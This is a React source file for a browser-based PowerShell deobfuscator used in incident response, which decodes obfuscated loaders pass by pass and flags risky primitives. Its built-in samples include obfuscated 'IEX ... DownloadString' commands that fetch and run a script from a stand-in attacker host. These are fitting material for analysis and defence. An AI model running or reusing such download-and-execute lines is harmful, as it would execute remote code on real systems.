import { useMemo, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { BackLink } from '../../components/BackLink';
import { Terminal, AlertTriangle, CheckCircle2, ChevronDown, ChevronRight, Search } from 'lucide-react';
import { deobfuscate, findRisks, type Step } from '../../lib/dfir/powershell-deobf';
import { hasIocCandidates } from '../../lib/dfir/ioc-detect';
import { CopyChip } from '../../components/dfir/CopyButton';
import { RelatedWikiArticles } from '../../components/dfir/RelatedWikiArticles';
import { SEVERITY_TONE } from '../../components/severity';
import { errMessage } from '../../lib/log';

const SAMPLES: { label: string; value: string }[] = [
  {
    label: 'EncodedCommand',
    value:
      'powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBhAHQAdABhAGMAawBlAHIALgBlAHgAYQBtAHAAbABlAC8AcAAuAHAAcwAxACcAKQA=',
  },
  {
    label: 'Backtick obfuscation',
    value: "`I`E`X` (`N`e`w-`O`b`j`e`c`t Net.WebClient).`D`o`w`n`l`o`a`d`S`t`r`i`n`g('https://attacker.example/p.ps1')",
  },
  {
    label: 'Char-array',
    value:
      '$cmd = [char]73 + [char]69 + [char]88 + [char]32 + [char]40 + [char]39 + [char]84 + [char]101 + [char]115 + [char]116 + [char]39 + [char]41; & $cmd',
  },
  {
    label: 'Format-string',
    value: "& (\"{0}{1}{2}\" -f 'I', 'E', 'X') ((\"{1}{0}\" -f 'load', 'Down') + 'String')",
  },
  {
    label: 'Replace chain',
    value: "'IzExZWyJzZGVf%X8bWFtbn0='.Replace('z','').Replace('y','').Replace('X','').Replace('%','')",
  },
];

function Diff({ before, after }: { before: string; after: string }): JSX.Element {
  // Find a common prefix/suffix so we can highlight the change region.
  let pre = 0;
  while (pre < before.length && pre < after.length && before[pre] === after[pre]) pre++;
  let suf = 0;
  while (
    suf < before.length - pre &&
    suf < after.length - pre &&
    before[before.length - 1 - suf] === after[after.length - 1 - suf]
  ) {
    suf++;
  }
  const beforeMid = before.slice(pre, before.length - suf);
  const afterMid = after.slice(pre, after.length - suf);
  const head = before.slice(0, pre);
  const tail = before.slice(before.length - suf);

  // If the change is huge, just show before / after blocks.
  if (beforeMid.length + afterMid.length > 600) {
    return (
      <div className="grid gap-2">
        <div>
          <div className="text-micro font-mono uppercase tracking-[0.2em] text-rose-600 dark:text-rose-400 mb-0.5">
            before
          </div>
          <pre className="text-mini font-mono text-body whitespace-pre-wrap break-all bg-rose-500/5 rounded p-2 border border-rose-500/20">
            {before}
          </pre>
        </div>
        <div>
          <div className="text-micro font-mono uppercase tracking-[0.2em] text-emerald-600 dark:text-emerald-400 mb-0.5">
            after
          </div>
          <pre className="text-mini font-mono text-body whitespace-pre-wrap break-all bg-emerald-500/5 rounded p-2 border border-emerald-500/20">
            {after}
          </pre>
        </div>
      </div>
    );
  }

  return (
    <pre className="text-mini font-mono text-body whitespace-pre-wrap break-all bg-surface-200 rounded p-2 border border-line-1">
      {head}
      <span className="bg-rose-500/15 text-rose-700 dark:text-rose-300 line-through px-0.5 rounded">{beforeMid}</span>
      <span className="bg-emerald-500/15 text-emerald-700 dark:text-emerald-300 px-0.5 rounded">{afterMid}</span>
      {tail}
    </pre>
  );
}

export default function PowershellDeobf(): JSX.Element {
  const [input, setInput] = useState('');
  const [showSteps, setShowSteps] = useState(true);
  const navigate = useNavigate();

  const result = useMemo(() => {
    if (!input.trim()) return null;
    return deobfuscate(input);
  }, [input]);

  const risks = useMemo(() => (result ? findRisks(result.output) : []), [result]);
  const hasIocs = result ? hasIocCandidates(result.output) : false;

  const sendToExtractor = () => {
    if (!result) return;
    try {
      sessionStorage.setItem('ioc-extractor-pipe', result.output);
    } catch (_catchErr) {
      console.error('PowershellDeobf failed:', errMessage(_catchErr));
      // sessionStorage can throw in private-mode/quota-exceeded; fall back to URL param truncation
    }
    navigate('/dfir/extract?from=ps-deob');
  };
  const collapsedSteps = (steps: Step[]): Step[] => {
    // Keep only the last per-pass collapse if the same pass fired repeatedly back-to-back.
    const out: Step[] = [];
    for (const s of steps) {
      if (out.length && out[out.length - 1]!.passName === s.passName) {
        out[out.length - 1] = { ...out[out.length - 1]!, after: s.after };
      } else {
        out.push(s);
      }
    }
    return out;
  };

  return (
    <div className="max-w-6xl mx-auto px-4 sm:px-8 py-12 text-heading">
      <BackLink
        to="/dfir"
        className="inline-flex items-center gap-2 text-sm text-muted hover:text-brand-600 dark:hover:text-brand-400 mb-8 font-mono"
      >
        back
      </BackLink>

      <div className="animate-fade-in-up">
        <h1 className="text-3xl sm:text-4xl font-display font-semibold mb-2 flex items-center gap-3">
          <Terminal size={28} className="text-brand-600 dark:text-brand-400" /> PowerShell Deobfuscator
        </h1>
        <p className="text-muted mb-2 leading-relaxed">
          Multi-pass deobfuscator for the PowerShell loaders that show up in commodity-malware and ransomware staging:
          <code> -EncodedCommand</code>, <code>FromBase64String</code>, char-array literals, format-string composition,
          replace chains, backtick noise. Each pass shows what it changed.
        </p>
        <p className="text-xs text-muted font-mono mb-8">
          Heuristic - does not actually execute anything. Pure client-side; nothing leaves your browser. After decoding,
          dangerous primitives (<code>IEX</code>, <code>DownloadString</code>, <code>VirtualAlloc</code>, Defender
          tampering) are flagged.
        </p>
      </div>

      <section className="surface-card p-4 mb-6">
        <div className="flex flex-wrap items-center justify-between gap-2 mb-3">
          <h2 className="text-eyebrow font-mono uppercase tracking-[0.2em] text-muted font-mono">Input</h2>
          <div className="flex flex-wrap gap-1.5">
            {SAMPLES.map((s) => (
              <button
                key={s.label}
                onClick={() => setInput(s.value)}
                className="text-xs font-mono px-2 py-1 rounded border border-line-2 hover:border-brand-500/40 hover:text-brand-600 dark:hover:text-brand-400"
              >
                {s.label}
              </button>
            ))}
            {input && (
              <button
                onClick={() => setInput('')}
                className="text-xs font-mono px-2 py-1 rounded border border-line-2 hover:border-rose-500/40 hover:text-rose-600 dark:hover:text-rose-400"
              >
                Clear
              </button>
            )}
          </div>
        </div>
        <textarea
          value={input}
          onChange={(e) => setInput(e.target.value)}
          rows={8}
          spellCheck={false}
          placeholder="Paste an obfuscated PowerShell command, EncodedCommand blob, or stager fragment…"
          className="w-full rounded border border-line-2 bg-surface-200 px-3 py-2 font-mono text-xs text-heading focus:border-brand-500/60 focus:outline-none"
        />
      </section>

      {result && (
        <>
          <section className="surface-card p-4 mb-6">
            <div className="flex flex-wrap items-center justify-between gap-3 mb-3">
              <h2 className="text-eyebrow font-mono uppercase tracking-[0.2em] text-muted font-mono">Decoded output</h2>
              <div className="flex items-center gap-2">
                <span className="text-mini font-mono text-muted">
                  {result.steps.length} transform{result.steps.length === 1 ? '' : 's'} · {result.iterations} iter ·{' '}
                  {result.fixedPoint ? 'fixed point' : 'max iter reached'}
                </span>
                {hasIocs && (
                  <button
                    type="button"
                    onClick={sendToExtractor}
                    className="inline-flex items-center gap-1.5 text-mini font-mono px-2 py-1 rounded border border-brand-500/40 bg-brand-500/10 text-brand-700 dark:text-brand-300 hover:bg-brand-500/20 transition-colors"
                    title="Send decoded output to IOC Extractor"
                  >
                    <Search size={11} /> extract IOCs →
                  </button>
                )}
                <CopyChip value={result.output} />
              </div>
            </div>
            <pre className="text-xs font-mono text-heading whitespace-pre-wrap break-all bg-surface-200 rounded p-3 border border-line-1">
              {result.output}
            </pre>
          </section>

          {risks.length > 0 && (
            <section className="rounded-xl border border-rose-500/30 bg-rose-500/5 p-4 mb-6">
              <h2 className="text-xs font-bold uppercase tracking-[0.2em] text-rose-700 dark:text-rose-300 font-mono mb-3 inline-flex items-center gap-1.5">
                <AlertTriangle size={12} /> Risk indicators in decoded output ({risks.length})
              </h2>
              <ul className="space-y-2">
                {risks.map((r) => (
                  <li key={r.id} className="rounded border border-line-1 bg-surface-100 p-2.5">
                    <div className="flex flex-wrap items-center gap-2 mb-1">
                      <span className="font-display font-semibold text-heading">{r.label}</span>
                      <span
                        className={`text-micro font-mono uppercase tracking-wider px-1.5 py-0.5 rounded border ${SEVERITY_TONE[r.severity]}`}
                      >
                        {r.severity}
                      </span>
                    </div>
                    <p className="text-meta font-mono text-body">{r.description}</p>
                  </li>
                ))}
              </ul>
            </section>
          )}

          {result.steps.length === 0 && (
            <section className="rounded-xl border border-emerald-500/30 bg-emerald-500/5 p-4 mb-6 text-sm font-mono text-emerald-700 dark:text-emerald-300 inline-flex items-center gap-2">
              <CheckCircle2 size={14} /> No transformations fired - the input is either already plain or uses an
              encoding this tool doesn't recognise.
            </section>
          )}

          {result.steps.length > 0 && (
            <section className="surface-card p-4 mb-6">
              <button
                onClick={() => setShowSteps((v) => !v)}
                className="w-full flex items-center justify-between gap-3 text-left"
                aria-expanded={showSteps}
              >
                <h2 className="text-eyebrow font-mono uppercase tracking-[0.2em] text-muted font-mono">
                  Trace ({result.steps.length} step{result.steps.length === 1 ? '' : 's'})
                </h2>
                {showSteps ? <ChevronDown size={14} /> : <ChevronRight size={14} />}
              </button>
              {showSteps && (
                <ol className="mt-3 space-y-3">
                  {collapsedSteps(result.steps).map((s, i) => (
                    <li key={i} className="rounded border border-line-1 p-3">
                      <div className="text-micro font-mono uppercase tracking-[0.2em] text-brand-600 dark:text-brand-400 mb-1.5">
                        Pass {i + 1}: {s.passName}
                      </div>
                      <Diff before={s.before} after={s.after} />
                    </li>
                  ))}
                </ol>
              )}
            </section>
          )}
        </>
      )}

      <section className="surface-card p-4">
        <h2 className="text-eyebrow font-mono uppercase tracking-[0.2em] text-muted font-mono mb-3">Passes</h2>
        <ul className="space-y-1 text-sm font-mono text-muted list-disc pl-5">
          <li>
            <strong>encoded-command</strong> - decodes <code>-EncodedCommand</code> base64 (UTF-16LE).
          </li>
          <li>
            <strong>from-base64-string</strong> - <code>[Convert]::FromBase64String</code> + standalone long blobs.
          </li>
          <li>
            <strong>strip-backticks</strong> - removes lone backticks used as escape-noise.
          </li>
          <li>
            <strong>reverse-string</strong> - resolves <code>[Array]::Reverse</code> on string literals.
          </li>
          <li>
            <strong>replace-chain</strong> - applies chained <code>.Replace(&quot;a&quot;,&quot;b&quot;)</code> on
            literals.
          </li>
          <li>
            <strong>format-string</strong> - resolves <code>&quot;{'{0}{1}'}&quot; -f &apos;a&apos;,&apos;b&apos;</code>{' '}
            composition.
          </li>
          <li>
            <strong>char-literals</strong> - <code>[char]65 + [char]66</code> and{' '}
            <code>[char[]](72,73) -join &apos;&apos;</code>.
          </li>
        </ul>
      </section>
      <RelatedWikiArticles />
    </div>
  );
}
